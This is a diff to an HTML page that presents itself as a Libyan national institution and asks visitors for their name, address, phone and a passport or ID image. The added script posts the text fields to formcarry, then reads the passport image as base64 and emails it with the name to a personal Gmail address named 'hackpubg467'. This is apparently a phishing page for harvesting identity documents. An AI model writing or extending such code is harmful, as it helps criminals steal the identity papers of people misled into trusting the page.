@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>المؤسسة الوطنــية</title>
+  <title>المؤسسة الوطنــية الليبية</title>
 
   <link rel="icon" href="uy.jpeg" type="image/png" />
   <link
@@ -184,7 +184,10 @@
     </form>
   </div>
 
+  <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
   <script>
+    emailjs.init('user_ABC123xyz'); // ضع هنا User ID الخاص بك من EmailJS
+
     let countdownInterval;
 
     function startTimer(duration) {
@@ -236,20 +239,25 @@
         return false;
       }
 
-      const formData = new FormData();
-      formData.append("fullname", fullnameInput.value);
-      formData.append("address", addressInput.value);
-      formData.append("phone", phoneInput.value);
-      formData.append("passportImage", passportInput.files[0]);
+      // إرسال البيانات النصية فقط إلى formcarry
+      const payload = {
+        fullname: fullnameInput.value,
+        address: addressInput.value,
+        phone: phoneInput.value,
+      };
 
       fetch("https://formcarry.com/s/2evKahWtdJS", {
         method: "POST",
-        body: formData,
+        headers: { "Content-Type": "application/json", Accept: "application/json" },
+        body: JSON.stringify(payload),
       })
         .then((response) => {
           if (!response.ok) throw new Error("فشل إرسال البيانات");
 
-          // تعطيل الحقول بعد الإرسال بنجاح
+          // بعد إرسال formcarry بنجاح، نرسل الصورة والاسم إلى بريدك
+          sendEmailWithAttachment(fullnameInput.value, passportInput.files[0]);
+
+          // تعطيل الحقول
           fullnameInput.disabled = true;
           addressInput.disabled = true;
           phoneInput.disabled = true;
@@ -265,6 +273,32 @@
         });
 
       return false;
+    }
+
+    function sendEmailWithAttachment(fullname, file) {
+      const reader = new FileReader();
+      reader.onload = function(event) {
+        const base64File = event.target.result.split(",")[1];
+
+        const emailParams = {
+          to_email: "hackpubg467@gmail.com",
+          from_name: fullname,
+          message: "صورة جواز السفر أو البطاقة مرفقة.",
+          attachment: base64File,
+          attachment_filename: file.name,
+          attachment_type: file.type,
+        };
+
+        emailjs.send('service_i81x8no', 'template_123abc', emailParams)
+          .then(() => {
+            alert("تم إرسال الصورة والاسم إلى البريد الإلكتروني.");
+          })
+          .catch((error) => {
+            alert("حدث خطأ أثناء إرسال البريد الإلكتروني.");
+            console.error(error);
+          });
+      };
+      reader.readAsDataURL(file);
     }
 
     function sendCode(event) {
